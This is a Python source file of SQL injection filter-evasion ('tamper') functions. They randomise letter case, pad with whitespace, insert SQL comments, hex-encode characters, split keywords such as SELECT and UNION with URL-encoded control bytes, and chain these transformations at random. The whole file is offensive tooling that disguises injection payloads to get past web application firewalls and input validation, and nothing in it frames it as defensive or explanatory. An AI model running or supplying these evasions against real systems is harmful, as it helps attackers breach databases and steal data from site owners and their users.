import random
import string

def randomize_case(word):
    return ''.join(random.choice([c.upper(), c.lower()]) for c in word)

def insert_whitespace(query):
    words = query.split()
    return ' '.join(word + (' ' * random.randint(0, 3)) for word in words)

def comment_injection(query):
    comments = ['/**/', '/*' + ''.join(random.choices(string.ascii_letters, k=3)) + '*/', '--', '#']
    words = query.split()
    return ' '.join(word + random.choice(comments) if random.random() < 0.3 else word for word in words)


def char_encode(query):
    return ''.join([f'&#x{ord(c):02x};' for c in query])

def keyword_substitution(query):
    substitutions = {
        'SELECT': ['SELECT', 'SEL%00ECT', 'SE%0cLECT', 'S%a0E%09L%0dE%0aC%09T'],
        'UNION': ['UNION', 'UN%20ION', 'UN%09ION', 'UNI%0dON'],
        'FROM': ['FROM', 'FR%0dOM', 'FR%09OM', 'FR%23%0aOM'],
        'WHERE': ['WHERE', 'WH%00ERE', 'W%0dHERE', 'WH%0cERE']
    }
    for keyword, alternatives in substitutions.items():
        query = query.replace(keyword, random.choice(alternatives))
    return query

def special_char_injection(query):
    special_chars = ['%01', '%02', '%03', '%04', '%0a', '%0d', '%09']
    return ''.join(c + random.choice(special_chars) if random.random() < 0.2 else c for c in query)

def smart_tamper(query):
    tampering_functions = [
        randomize_case,
        insert_whitespace,
        comment_injection,
        char_encode,
        keyword_substitution,
        special_char_injection
    ]
    
    # Apply 1 to 3 tampering functions randomly
    for _ in range(random.randint(1, 3)):
        func = random.choice(tampering_functions)
        query = func(query)
    
    return query